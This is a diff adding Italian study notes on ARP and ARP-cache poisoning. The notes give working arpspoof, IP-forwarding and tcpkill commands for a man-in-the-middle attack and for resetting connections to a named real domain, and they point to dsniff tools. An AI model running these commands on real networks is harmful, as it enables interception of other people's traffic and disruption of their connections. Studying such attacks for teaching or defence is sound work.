@@ -1,0 +1,30 @@
+Si è introdotto rapidamente come funziona ARP: ad ogni IP è associato il MAC Address, queste informazioni sono tenute assieme sui computer e router in "tabella cache arp". Ogni volta che un nodo della rete vuole contattare un IP invia una "arp request <ip>" per aspettare una "arp reply <MAC>" dall'host che ha quell'IP. Questi scambi vengono fatti in BROADCAST.
+
+Spesso succede però che i sistemi operativi non cercano "arp reply" dopo "arp request" ma appena passa una "arp reply" la prendono per buona.
+
+Questo introduce l'argomento "arp poisoning".
+
+Se la mia scheda di rete invia "arp reply"" continuamente posso cercare di "stordire", appunto poisoning, la "arp cache" di un host di rete.
+
+Queste operazioni sono automatizzate tramite un utility che si chiama arpspoof
+http://manpages.ubuntu.com/manpages/raring/en/man8/arpspoof.8.html
+arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
+arpspoof -i eth0 -t 192.168.x.x -r 192.168.x.x
+
+Inoltre è necessario indicare a Linux che vogliano lavorare come router e quindi eseguire il forward dei pacchetti che ci arrivano da altri verso il gateway
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Maggiori dettagli nel seguente articolo
+TCP/iP HACKS F0R PHUN AND PR0FiT
+http://www.s0ftpj.org/bfi/online/bfi5/bfi5.10.html
+	
+Tramite il seguente comando posso controllare la cache arp di sistema
+arp -a
+
+Tramite il seguente comando indico di eseguire "CONNECTION RESET" su ogni connessione TCP/IP che viene aperta verso il dominio indicato dal comando
+tcpkill -9 -i etho host www.didasca.it
+
+ImperialVioled blog dedicato ai problemi di SSL/TLS
+
+Una volta realizzato l'arpspoof si può utilizzare i tool della suite dsniff(http://www.monkey.org/~dugsong/dsniff/) come ad esempio driftnet dnsspoof.
